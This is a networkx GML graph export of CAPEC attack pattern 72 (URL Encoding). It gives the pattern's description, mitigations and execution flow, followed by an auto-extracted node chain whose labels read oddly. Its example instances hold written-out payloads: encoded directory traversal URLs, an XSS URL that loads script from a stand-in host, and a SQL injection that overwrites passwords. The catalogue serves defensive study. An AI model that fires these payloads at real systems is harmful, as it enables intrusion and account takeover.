graph [
  directed 1
  capec_id "72"
  name "URL Encoding"
  abstraction "Detailed"
  status "Draft"
  description "This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL."
  likelihood "High"
  severity "High"
  related_attack_patterns "_networkx_list_start"
  related_attack_patterns [
    capec_id "267"
    nature "ChildOf"
  ]
  prerequisites "The application should accepts and decodes URL input."
  prerequisites "The application performs insufficient filtering/canonicalization on the URLs."
  skills_required [
    level "Low"
    description "An adversary can try special characters in the URL and bypass the URL validation."
  ]
  skills_required [
    level "Medium"
    description "The adversary may write a script to defeat the input filtering mechanism."
  ]
  resources_required "[]"
  consequences [
    scope "_networkx_list_start"
    scope "Confidentiality"
    impact "Read Data"
  ]
  consequences [
    scope "_networkx_list_start"
    scope "Availability"
    impact "Resource Consumption"
  ]
  consequences [
    scope "Confidentiality"
    scope "Integrity"
    scope "Availability"
    impact "Execute Unauthorized Commands"
  ]
  consequences [
    scope "Confidentiality"
    scope "Access Control"
    scope "Authorization"
    impact "Gain Privileges"
  ]
  mitigations "Refer to the RFCs to safely decode URL."
  mitigations "Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive."
  mitigations "There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)."
  mitigations "Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process."
  mitigations "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input."
  mitigations "Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)"
  mitigations "When client input is required from web-based forms, avoid using the &#34;GET&#34; method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the &#34;POST method whenever possible."
  example_instances "URL Encodings in IceCast MP3 Server. The following type of encoded string has been known traverse directories against the IceCast MP3 server9: http://[targethost]:8000/somefile/%2E%2E/target.mp3 or using &#34;/%25%25/&#34; instead of &#34;/../&#34;. The control character &#34;..&#34; can be used by an adversary to escape the document root. See also: CVE-2001-0784"
  example_instances "Cross-Site Scripting URL-Encoded attack: http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTML execution: <script src=&#34;http://www.badplace.com/nasty.js&#34;></script> [REF-495]"
  example_instances "SQL Injection Original database query in the example file - &#34;login.asp&#34;: SQLQuery = &#34;SELECT preferences FROM logintable WHERE userid='&#34; &#38; Request.QueryString(&#34;userid&#34;) &#38; &#34;' AND password='&#34; &#38; Request.QueryString(&#34;password&#34;) &#38; &#34;';&#34; URL-encoded attack: http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 Executed database query: SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d'; From &#34;URL encoded attacks&#34;, by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"
  example_instances "Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An adversary could provide a URL that included a string like /...%5C/ This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot. See also: CVE-2001-1335"
  related_weaknesses "173"
  related_weaknesses "177"
  related_weaknesses "172"
  related_weaknesses "73"
  related_weaknesses "74"
  related_weaknesses "20"
  matched_cwes "73"
  matched_cwes "20"
  matched_cwes "74"
  taxonomy_mappings "[]"
  execution_flow [
    step "1"
    phase "Explore"
    description "[Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters."
    techniques "_networkx_list_start"
    techniques "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL."
  ]
  execution_flow [
    step "2"
    phase "Experiment"
    description "[Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the &#34;Explore&#34; phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them."
    techniques "Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally."
    techniques "Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes."
  ]
  execution_flow [
    step "3"
    phase "Exploit"
    description "[Inject special characters into URL parameters] Using the information gathered in the &#34;Experiment&#34; phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc."
    techniques "[]"
  ]
  node [
    id 0
    label "access_the_application"
  ]
  node [
    id 1
    label "make_special_note_of_any_links_that_include_parameters_in_the_url"
  ]
  node [
    id 2
    label "probe_urls"
  ]
  node [
    id 3
    label "filter_that"
  ]
  node [
    id 4
    label "use_url_encoding"
  ]
  node [
    id 5
    label "try_to_encode_some_special_characters_in_the_url"
  ]
  node [
    id 6
    label "escape_the_document_root"
  ]
  node [
    id 7
    label "encode_scripting"
  ]
  node [
    id 8
    label "update_logintable"
  ]
  node [
    id 9
    label "release_a_freeware_ftp_server_for_windows_that_fails_to_provide_proper_filtering_against_multiple_encoding"
  ]
  node [
    id 10
    label "include_a_web_server_component_that_could_be_attacked_with_a_combination_of_the_triple_dot_and_url_encoding_attacks"
  ]
  node [
    id 11
    label "provide_a_url_that_included_a_string_like"
  ]
  node [
    id 12
    label "involve_an_aggregation_of_several_tricks"
  ]
  node [
    id 13
    label "perform_insufficient_filtering_canonicalization_on_the_urls"
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 1
    target 2
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 3
    target 4
  ]
  edge [
    source 4
    target 5
  ]
  edge [
    source 5
    target 6
  ]
  edge [
    source 6
    target 7
  ]
  edge [
    source 7
    target 8
  ]
  edge [
    source 8
    target 9
  ]
  edge [
    source 9
    target 10
  ]
  edge [
    source 10
    target 11
  ]
  edge [
    source 11
    target 12
  ]
  edge [
    source 12
    target 13
  ]
]
